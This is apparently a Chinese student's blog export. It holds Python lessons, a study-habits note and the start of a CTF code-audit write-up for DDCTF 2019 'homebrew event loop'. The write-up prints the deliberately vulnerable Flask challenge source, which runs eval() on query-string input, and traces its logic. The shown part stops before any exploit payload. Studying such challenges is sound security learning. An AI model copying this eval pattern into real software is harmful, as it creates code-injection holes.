<p><img src="/2021/04/13/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%AD%A6python/2.png" alt="2"></p>
<hr>
<h3 id="拓展"><strong>拓展</strong></h3>
<p>如果知道字符的整数编码，还可以用十六进制这么写<code>str</code>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; &#39;\u4e2d\u6587&#39;</span><br><span class="line">&#39;中文&#39;</span><br></pre></td></tr></table></figure>
<p>要计算<code>str</code>包含多少个字符，可以用<code>len()</code>函数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; len(&#39;ABC&#39;)</span><br><span class="line">3</span><br><span class="line">&gt;&gt;&gt; len(&#39;中文&#39;)</span><br><span class="line">2</span><br></pre></td></tr></table></figure>
<p>在Python中，采用的格式化方式和C语言是一致的，用<code>%</code>实现，举例如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; &#39;Hello, %s&#39; % &#39;world&#39;</span><br><span class="line">&#39;Hello, world&#39;</span><br><span class="line">&gt;&gt;&gt; &#39;Hi, %s, you have $%d.&#39; % (&#39;Michael&#39;, 1000000)</span><br><span class="line">&#39;Hi, Michael, you have $1000000.&#39;</span><br></pre></td></tr></table></figure>
<p>你可能猜到了，<code>%</code>运算符就是用来格式化字符串的。在字符串内部，<code>%s</code>表示用字符串替换，<code>%d</code>表示用整数替换，有几个<code>%?</code>占位符，后面就跟几个变量或者值，顺序要对应好。如果只有一个<code>%?</code>，括号可以省略。</p>
<p><img src="/2021/04/13/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%AD%A6python/3.png" alt="3"></p>
<hr>
<h2 id="从零开始学Python-第004课：Python语言元素之运算符"><strong>从零开始学Python - 第004课：Python语言元素之运算符</strong></h2>
<p><img src="/2021/04/13/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%AD%A6python/4.jpg" alt="4"></p>
<blockquote>
<p><strong>说明：</strong> 上面这个表格实际上是按照运算符的优先级从上到下列出了各种运算符。所谓优先级就是在一个运算的表达式中，如果出现了多个运算符，应该先执行哪个运算再执行哪个运算的顺序。在实际开发中，如果搞不清楚运算符的优先级，可以使用圆括号来确保运算的执行顺序。</p>
</blockquote>
<h4 id="算术运算符">算术运算符</h4>
<p>Python中的算术运算符非常丰富，除了大家最为熟悉的加减乘除之外，还有整除运算符、求模（求余数）运算符和求幂运算符。下面的例子为大家展示了算术运算符的使用。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="number">321</span> + <span class="number">123</span>)     <span class="comment"># 加法运算</span></span><br><span class="line"><span class="built_in">print</span>(<span class="number">321</span> - <span class="number">123</span>)     <span class="comment"># 减法运算</span></span><br><span class="line"><span class="built_in">print</span>(<span class="number">321</span> * <span class="number">123</span>)     <span class="comment"># 乘法运算</span></span><br><span class="line"><span class="built_in">print</span>(<span class="number">321</span> / <span class="number">123</span>)     <span class="comment"># 除法运算</span></span><br><span class="line"><span class="built_in">print</span>(<span class="number">321</span> % <span class="number">123</span>)     <span class="comment"># 求模运算  就是取余数运算</span></span><br><span class="line"><span class="built_in">print</span>(<span class="number">321</span> // <span class="number">123</span>)    <span class="comment"># 整除运算</span></span><br><span class="line"><span class="built_in">print</span>(<span class="number">321</span> ** <span class="number">123</span>)    <span class="comment"># 求幂运算</span></span><br></pre></td></tr></table></figure>
<p><img src="/2021/04/13/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%AD%A6python/4.png" alt="4"></p>
<h4 id="赋值运算符"><strong>赋值运算符</strong></h4>
<p>赋值运算符应该是最为常见的运算符，它的作用是将右边的值赋给左边的变量。下面的例子演示了赋值运算符和复合赋值运算符的使用。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">赋值运算符和复合赋值运算符</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Version: 0.1</span></span><br><span class="line"><span class="string">Author: 骆昊</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">a = <span class="number">10</span></span><br><span class="line">b = <span class="number">3</span></span><br><span class="line">a += b        <span class="comment"># 相当于：a = a + b</span></span><br><span class="line">a *= a + <span class="number">2</span>    <span class="comment"># 相当于：a = a * (a + 2)</span></span><br><span class="line"><span class="built_in">print</span>(a)      <span class="comment"># 算一下这里会输出什么</span></span><br></pre></td></tr></table></figure>
<h4 id="比较运算符和逻辑运算符"><strong>比较运算符和逻辑运算符</strong></h4>
<p>比较运算符有的地方也称为关系运算符，包括<code>==</code>、<code>!=</code>、<code>&lt;</code>、<code>&gt;</code>、<code>&lt;=</code>、<code>&gt;=</code>，我相信没有什么好解释的，大家一看就能懂，需要提醒的是比较相等用的是<code>==</code>，请注意这里是两个等号，因为<code>=</code>是赋值运算符，我们在上面刚刚讲到过，<code>==</code>才是比较相等的运算符；比较不相等用的是<code>!=</code>，这不同于数学上的不等号，Python 2中曾经使用过<code>&lt;&gt;</code>来表示不等关系，大家知道就可以了。比较运算符会产生布尔值，要么是<code>True</code>要么是<code>False</code>。</p>
<p>逻辑运算符有三个，分别是<code>and</code>、<code>or</code>和<code>not</code>。<code>and</code>字面意思是“而且”，所以<code>and</code>运算符会连接两个布尔值，如果两个布尔值都是<code>True</code>，那么运算的结果就是<code>True</code>；左右两边的布尔值有一个是<code>False</code>，最终的运算结果就是<code>False</code>。相信大家已经想到了，如果<code>and</code>左边的布尔值是<code>False</code>，不管右边的布尔值是什么，最终的结果都是<code>False</code>，所以在做运算的时候右边的值会被跳过（短路处理），这也就意味着在<code>and</code>运算符左边为<code>False</code>的情况下，右边的表达式根本不会执行。<code>or</code>字面意思是“或者”，所以<code>or</code>运算符也会连接两个布尔值，如果两个布尔值有任意一个是<code>True</code>，那么最终的结果就是<code>True</code>。当然，<code>or</code>运算符也是有短路功能的，在它左边的布尔值为<code>True</code>的情况下，右边的表达式根本不会执行。<code>not</code>运算符的后面会跟上一个布尔值，它的作用是得到与该布尔值相反的值，也就是说，<code>not</code>后面的布尔值如果是<code>True</code>，运算结果就是<code>False</code>；而<code>not</code>后面的布尔值如果是<code>False</code>，运算结果就是<code>True</code></p>
]]></content>
      <categories>
        <category>python学习</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>从零开始学python第二天</title>
    <url>/2021/04/15/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%AD%A6python%E7%AC%AC%E4%BA%8C%E5%A4%A9/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>总结一下最近学习状况</title>
    <url>/2021/04/10/%E6%80%BB%E7%BB%93%E4%B8%80%E4%B8%8B%E6%9C%80%E8%BF%91%E5%AD%A6%E4%B9%A0%E7%8A%B6%E5%86%B5/</url>
    <content><![CDATA[<p>看了一下最近自己博客更新速度（大二）和自己打比赛的状况，三个字来概括就是“很差劲”。打比赛很多题还是不会，感觉真的没有在认真学，内心非常浮躁，没有对紧迫时间的敬畏。真的必须规定自己每天至少一道web或者python，总结题目的时间至少在两个小时以上才行</p>
]]></content>
      <categories>
        <category>学习状态</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>杂谈</tag>
      </tags>
  </entry>
  <entry>
    <title>DDCTF 2019 homebrew event loop</title>
    <url>/2021/04/11/DDCTF-2019-homebrew-event-loop/</url>
    <content><![CDATA[<blockquote>
<p>有点意思的一道代码审计题</p>
</blockquote>
<h2 id="先简单串烧一下一些基本知识点">先简单串烧一下一些基本知识点</h2>
<ul>
<li>
<p><a href="https://blog.csdn.net/weixin_39968266/article/details/113968543">session in python</a></p>
</li>
<li>
<p><a href="https://blog.csdn.net/weixin_34837388/article/details/112011783">append in python</a></p>
</li>
<li>
<p><a href="https://blog.csdn.net/u012193416/article/details/78115377">_str in python</a></p>
</li>
<li>
<p><a href="https://www.cnblogs.com/baojiao/p/9336857.html">flask的常用接收参数的方法</a></p>
</li>
<li>
<p><a href="https://www.yiibai.com/python_network_programming/python_routing.html">python路由</a></p>
</li>
</ul>
<hr>
<h2 id="python文件源码"><strong>python文件源码</strong></h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, request, Response</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="string">&#x27;*********************&#x27;</span>  <span class="comment"># censored</span></span><br><span class="line">url_prefix = <span class="string">&#x27;/d5afe1f66147e857&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">FLAG</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;*********************&#x27;</span>  <span class="comment"># censored</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trigger_event</span>(<span class="params">event</span>):</span> //trigger_event：标识触发事件，取值为 INSERT、UPDATE 或 DELETE；</span><br><span class="line">    session[<span class="string">&#x27;log&#x27;</span>].append(event)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(session[<span class="string">&#x27;log&#x27;</span>]) &gt; <span class="number">5</span>:</span><br><span class="line">        session[<span class="string">&#x27;log&#x27;</span>] = session[<span class="string">&#x27;log&#x27;</span>][-<span class="number">5</span>:]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span>(event) == <span class="built_in">type</span>([]):</span><br><span class="line">        request.event_queue += event</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        request.event_queue.append(event)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_mid_str</span>(<span class="params">haystack, prefix, postfix=<span class="literal">None</span></span>):</span></span><br><span class="line">    haystack = haystack[haystack.find(prefix)+<span class="built_in">len</span>(prefix):]</span><br><span class="line">    <span class="keyword">if</span> postfix <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        haystack = haystack[:haystack.find(postfix)]</span><br><span class="line">    <span class="keyword">return</span> haystack</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RollBackException</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">execute_event_loop</span>():</span></span><br><span class="line">    valid_event_chars = <span class="built_in">set</span>(</span><br><span class="line">        <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#&#x27;</span>)</span><br><span class="line">    resp = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(request.event_queue) &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="comment"># `event` is something like &quot;action:ACTION;ARGS0#ARGS1#ARGS2......&quot;</span></span><br><span class="line">        event = request.event_queue[<span class="number">0</span>]</span><br><span class="line">        request.event_queue = request.event_queue[<span class="number">1</span>:]</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> event.startswith((<span class="string">&#x27;action:&#x27;</span>, <span class="string">&#x27;func:&#x27;</span>)):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> event:</span><br><span class="line">            <span class="keyword">if</span> c <span class="keyword">not</span> <span class="keyword">in</span> valid_event_chars:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            is_action = event[<span class="number">0</span>] == <span class="string">&#x27;a&#x27;</span></span><br><span class="line">            action = get_mid_str(event, <span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;;&#x27;</span>)</span><br><span class="line">            args = get_mid_str(event, action+<span class="string">&#x27;;&#x27;</span>).split(<span class="string">&#x27;#&#x27;</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                event_handler = <span class="built_in">eval</span>(</span><br><span class="line">                    action + (<span class="string">&#x27;_handler&#x27;</span> <span class="keyword">if</span> is_action <span class="keyword">else</span> <span class="string">&#x27;_function&#x27;</span>))</span><br><span class="line">                ret_val = event_handler(args)</span><br><span class="line">            <span class="keyword">except</span> RollBackException:</span><br><span class="line">                <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                    resp = <span class="string">&#x27;&#x27;</span></span><br><span class="line">                resp += <span class="string">&#x27;ERROR! All transactions have been cancelled. &lt;br /&gt;&#x27;</span></span><br><span class="line">                resp += <span class="string">&#x27;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&#x27;</span></span><br><span class="line">                session[<span class="string">&#x27;num_items&#x27;</span>] = request.prev_session[<span class="string">&#x27;num_items&#x27;</span>]</span><br><span class="line">                session[<span class="string">&#x27;points&#x27;</span>] = request.prev_session[<span class="string">&#x27;points&#x27;</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span> Exception, e:</span><br><span class="line">                <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                    resp = <span class="string">&#x27;&#x27;</span></span><br><span class="line">                <span class="comment"># resp += str(e) # only for debugging</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> ret_val <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                    resp = ret_val</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    resp += ret_val</span><br><span class="line">    <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> resp == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        resp = (<span class="string">&#x27;404 NOT FOUND&#x27;</span>, <span class="number">404</span>)</span><br><span class="line">    session.modified = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params">url_prefix+<span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">entry_point</span>():</span></span><br><span class="line">    querystring = urllib.unquote(request.query_string)</span><br><span class="line">    request.event_queue = []</span><br><span class="line">    <span class="keyword">if</span> querystring == <span class="string">&#x27;&#x27;</span> <span class="keyword">or</span> (<span class="keyword">not</span> querystring.startswith(<span class="string">&#x27;action:&#x27;</span>)) <span class="keyword">or</span> <span class="built_in">len</span>(querystring) &gt; <span class="number">100</span>:</span><br><span class="line">        querystring = <span class="string">&#x27;action:index;False#False&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;num_items&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">        session[<span class="string">&#x27;num_items&#x27;</span>] = <span class="number">0</span></span><br><span class="line">        session[<span class="string">&#x27;points&#x27;</span>] = <span class="number">3</span></span><br><span class="line">        session[<span class="string">&#x27;log&#x27;</span>] = []</span><br><span class="line">    request.prev_session = <span class="built_in">dict</span>(session)</span><br><span class="line">    trigger_event(querystring)</span><br><span class="line">    <span class="keyword">return</span> execute_event_loop()</span><br><span class="line"></span><br><span class="line"><span class="comment"># handlers/functions below --------------------------------------</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view_handler</span>(<span class="params">args</span>):</span></span><br><span class="line">    page = args[<span class="number">0</span>]</span><br><span class="line">    html = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    html += <span class="string">&#x27;[INFO] you have &#123;&#125; diamonds, &#123;&#125; points now.&lt;br /&gt;&#x27;</span>.<span class="built_in">format</span>(</span><br><span class="line">        session[<span class="string">&#x27;num_items&#x27;</span>], session[<span class="string">&#x27;points&#x27;</span>])</span><br><span class="line">    <span class="keyword">if</span> page == <span class="string">&#x27;index&#x27;</span>:</span><br><span class="line">        html += <span class="string">&#x27;&lt;a href=&quot;./?action:index;True%23False&quot;&gt;View source code&lt;/a&gt;&lt;br /&gt;&#x27;</span></span><br><span class="line">        html += <span class="string">&#x27;&lt;a href=&quot;./?action:view;shop&quot;&gt;Go to e-shop&lt;/a&gt;&lt;br /&gt;&#x27;</span></span><br><span class="line">        html += <span class="string">&#x27;&lt;a href=&quot;./?action:view;reset&quot;&gt;Reset&lt;/a&gt;&lt;br /&gt;&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> page == <span class="string">&#x27;shop&#x27;</span>:</span><br><span class="line">        html += <span class="string">&#x27;&lt;a href=&quot;./?action:buy;1&quot;&gt;Buy a diamond (1 point)&lt;/a&gt;&lt;br /&gt;&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> page == <span class="string">&#x27;reset&#x27;</span>:</span><br><span class="line">        <span class="keyword">del</span> session[<span class="string">&#x27;num_items&#x27;</span>]</span><br><span class="line">        html += <span class="string">&#x27;Session reset.&lt;br /&gt;&#x27;</span></span><br><span class="line">    html += <span class="string">&#x27;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index_handler</span>(<span class="params">args</span>):</span></span><br><span class="line">    bool_show_source = <span class="built_in">str</span>(args[<span class="number">0</span>])</span><br><span class="line">    bool_download_source = <span class="built_in">str</span>(args[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">if</span> bool_show_source == <span class="string">&#x27;True&#x27;</span>:</span><br><span class="line"></span><br><span class="line">        source = <span class="built_in">open</span>(<span class="string">&#x27;eventLoop.py&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">        html = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> bool_download_source != <span class="string">&#x27;True&#x27;</span>:</span><br><span class="line">            html += <span class="string">&#x27;&lt;a href=&quot;./?action:index;True%23True&quot;&gt;Download this .py file&lt;/a&gt;&lt;br /&gt;&#x27;</span></span><br><span class="line">            html += <span class="string">&#x27;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> source:</span><br><span class="line">            <span class="keyword">if</span> bool_download_source != <span class="string">&#x27;True&#x27;</span>:</span><br><span class="line">                html += line.replace(<span class="string">&#x27;&amp;&#x27;</span>, <span class="string">&#x27;&amp;amp;&#x27;</span>).replace(<span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;&amp;nbsp;&#x27;</span>*<span class="number">4</span>).replace(</span><br><span class="line">                    <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&amp;nbsp;&#x27;</span>).replace(<span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;&amp;lt;&#x27;</span>).replace(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;&amp;gt;&#x27;</span>).replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&lt;br /&gt;&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                html += line</span><br><span class="line">        source.close()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> bool_download_source == <span class="string">&#x27;True&#x27;</span>:</span><br><span class="line">            headers = &#123;&#125;</span><br><span class="line">            headers[<span class="string">&#x27;Content-Type&#x27;</span>] = <span class="string">&#x27;text/plain&#x27;</span></span><br><span class="line">            headers[<span class="string">&#x27;Content-Disposition&#x27;</span>] = <span class="string">&#x27;attachment; filename=serve.py&#x27;</span></span><br><span class="line">            <span class="keyword">return</span> Response(html, headers=headers)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> html</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        trigger_event(<span class="string">&#x27;action:view;index&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">buy_handler</span>(<span class="params">args</span>):</span></span><br><span class="line">    num_items = <span class="built_in">int</span>(args[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">if</span> num_items &lt;= <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;invalid number(&#123;&#125;) of diamonds to buy&lt;br /&gt;&#x27;</span>.<span class="built_in">format</span>(args[<span class="number">0</span>])</span><br><span class="line">    session[<span class="string">&#x27;num_items&#x27;</span>] += num_items</span><br><span class="line">    trigger_event([<span class="string">&#x27;func:consume_point;&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(</span><br><span class="line">        num_items), <span class="string">&#x27;action:view;index&#x27;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">consume_point_function</span>(<span class="params">args</span>):</span></span><br><span class="line">    point_to_consume = <span class="built_in">int</span>(args[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">&#x27;points&#x27;</span>] &lt; point_to_consume:</span><br><span class="line">        <span class="keyword">raise</span> RollBackException()</span><br><span class="line">    session[<span class="string">&#x27;points&#x27;</span>] -= point_to_consume</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_flag_function</span>(<span class="params">args</span>):</span></span><br><span class="line">    flag = args[<span class="number">0</span>]</span><br><span class="line">    <span class="comment"># return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it.</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;You naughty boy! ;) &lt;br /&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag_handler</span>(<span class="params">args</span>):</span></span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">&#x27;num_items&#x27;</span>] &gt;= <span class="number">5</span>:</span><br><span class="line">        <span class="comment"># show_flag_function has been disabled, no worries</span></span><br><span class="line">        trigger_event(<span class="string">&#x27;func:show_flag;&#x27;</span> + FLAG())</span><br><span class="line">    trigger_event(<span class="string">&#x27;action:view;index&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">False</span>, host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<hr>
<h2 id="0X01-开始代码审计-😓"><strong>0X01 开始代码审计</strong> 😓</h2>
<ul>
<li>首先我们从<a href="https://www.yiibai.com/python_network_programming/python_routing.html">路由</a>入手，然后我们慢慢去看它调用了哪些函数，这里只用了一个<a href="https://www.yiibai.com/python_network_programming/python_routing.html">路由</a></li>
</ul>
<p><img src="/2021/04/11/DDCTF-2019-homebrew-event-loop/1.png" alt="1"></p>
<ul>
<li>这里顺便学习一下<a href="https://www.cnblogs.com/baojiao/p/9336857.html">flask常用的接受参数方法</a></li>
</ul>
<p><img src="/2021/04/11/DDCTF-2019-homebrew-event-loop/2.png" alt="2"></p>
<ul>
<li>当我们看到第81行就知道，<strong>querystring = urllib.unquote(request.query_string)</strong>  接收url? 后面的所有的值，然后进行url编码，传入参数<strong>querystring</strong> 中</li>
</ul>
<p><img src="/2021/04/11/DDCTF-2019-homebrew-event-loop/3.png" alt="3"></p>
<p>​         <strong>接着有个判断条件</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> querystring == <span class="string">&#x27;&#x27;</span> <span class="keyword">or</span> (<span class="keyword">not</span> querystring.startswith(<span class="string">&#x27;action:&#x27;</span>)) <span class="keyword">or</span> <span class="built_in">len</span>(querystring) &gt; <span class="number">100</span></span><br></pre></td></tr></table></figure>
<ul>
<li>结合上面，如果没有传递任何参数为空或者不是以action开头</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">(<span class="keyword">not</span> querystring.startswith(<span class="string">&#x27;action:&#x27;</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>又或者上传参数长度大于100</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">or</span> <span class="built_in">len</span>(querystring) &gt; <span class="number">100</span></span><br></pre></td></tr></table></figure>
<ul>
<li>那么就会进入条件判断语句，强化初始化参数</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">querystring = <span class="string">&#x27;action:index;False#False&#x27;</span></span><br></pre></td></tr></table></figure>
<p>后面的内容就是我们买钻石的网站，我们先盲猜一下 <strong><code>num_items</code></strong>  是我们买东西的清单，如果我们什么都没买，就是初始化session中的列表</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">session[<span class="string">&#x27;num_items&#x27;</span>] = <span class="number">0</span></span><br><span class="line">session[<span class="string">&#x27;points&#x27;</span>] = <span class="number">3</span></span><br><span class="line">session[<span class="string">&#x27;log&#x27;</span>] = []</span><br></pre></td></tr></table></figure>
<p><strong>从现在来看，之前的一切都是在为我们买东西做准备，接收了我们的参数以后，如果我们没有买东西，就是我们初步登录的这个界面，将我们一切东西初始化。重点是下面三个</strong></p>
<p><img src="/2021/04/11/DDCTF-2019-homebrew-event-loop/4.png" alt="4"></p>
<hr>
<p><strong><code>request.prev_session = dict(session)</code></strong>  这把刚刚初始化的session用字典的形式传给了这个参数到了90行，我们看到了一个函数 <strong><code>trigger_event</code></strong> ,我们在vscode上面跟进这个函数</p>
<p><img src="/2021/04/11/DDCTF-2019-homebrew-event-loop/5.png" alt="5"></p>
<p>可以看到，实际上**<code>trigger_event</code><strong>的形参</strong><code>event</code>**  就是我们刚刚获得url?后面的字符串 <strong><code>querystring</code></strong>  。并且将它加入到</p>
<p><strong><code>session['log']</code></strong>  这个日志</p>
<p>问题来了，下面两个if语句，是什么意思呢？</p>
<ul>
<li>
<p><strong>第一个</strong></p>
<p><img src="/2021/04/11/DDCTF-2019-homebrew-event-loop/7.png" alt="7"></p>
</li>
</ul>
<p>举个例子<img src="/2021/04/11/DDCTF-2019-homebrew-event-loop/6.png" alt="6">  ，也就是要后面5个，前面都不要了</p>
<ul>
<li><strong>第二个</strong></li>
</ul>
<p><img src="/2021/04/11/DDCTF-2019-homebrew-event-loop/8.png" alt="8"></p>
<p>如果我们刚刚传入的参数也就是url?后面的字符串是列表类型，就合并。这两个列表 <strong><code>request.event_queue</code></strong>  和 **<code>event</code>**合并在一起。可能有人会问 <strong><code>request.event_queue</code></strong>  是什么，就在前面才定义 😢</p>
<p><img src="/2021/04/11/DDCTF-2019-homebrew-event-loop/9.png" alt="9"></p>
<p>这个时候，你也许会问，它之前在路由定义的，现在函数里面能用吗？可以，因为它是全局变量，即使函数没有声明，也可以使用。 * 顺便说一下，列表也是可以合并的，a=[1,5] b=[3,4,5]   a+b=[1,3,4,5,5] *</p>
<p>如果没有进行第二个if条件判断，就执行  <strong><code>request.event_queue.append(event)</code></strong>  加入到这个列表当中。</p>
<hr>
<p>这个时候我们来看91行的return返回函数  <strong><code>return execute_event_loop()</code></strong>  ,我们在vscode上面跟进函数</p>
<p><img src="/2021/04/11/DDCTF-2019-homebrew-event-loop/10.png" alt="10"></p>
<p>首先初始化设置了两个参数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">valid_event_chars = <span class="built_in">set</span>(</span><br><span class="line">        <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#&#x27;</span>)</span><br><span class="line">    resp = <span class="literal">None</span></span><br></pre></td></tr></table></figure>
<p>进入while循环吗，我们再来想一下request.enent_queque是什么东西？</p>
<p><img src="/2021/04/11/DDCTF-2019-homebrew-event-loop/11.png" alt="11"></p>
<p>也就是我们url?后面的字符串，加入到这个列表中。以后不会再重复了</p>
<hr>
<p>while循环一进来就是这个</p>
<p><img src="/2021/04/11/DDCTF-2019-homebrew-event-loop/12.png" alt="12"></p>
<p>就是将我们刚刚输入的字符串的列表第一个赋值给 <strong><code>event</code></strong>  ,然后删除了第一个值，因为第一个值已经给了 <strong><code>event</code></strong>  ,然后删除了第一个值，因为第一个值已经给了 <strong><code>event</code></strong>  ，没必要留着</p>
<p><img src="/2021/04/11/DDCTF-2019-homebrew-event-loop/13.png" alt="13"></p>
<p><strong><code>  if not event.startswith(('action:', 'func:')):</code></strong></p>
<p>如果我们第一个字符串开头不是  <strong><code>action </code></strong> 或 <strong><code>func</code></strong> ,就进入if判断语句继续。下一个for循环一次检验 <strong><code>event</code></strong>  中有没有字符，，可能有人忘了  <strong><code>valid_event_chars:</code></strong>  是什么…</p>
<p><img src="/2021/04/11/DDCTF-2019-homebrew-event-loop/14.png" alt="14"></p>
<hr>
<p>重点来了</p>
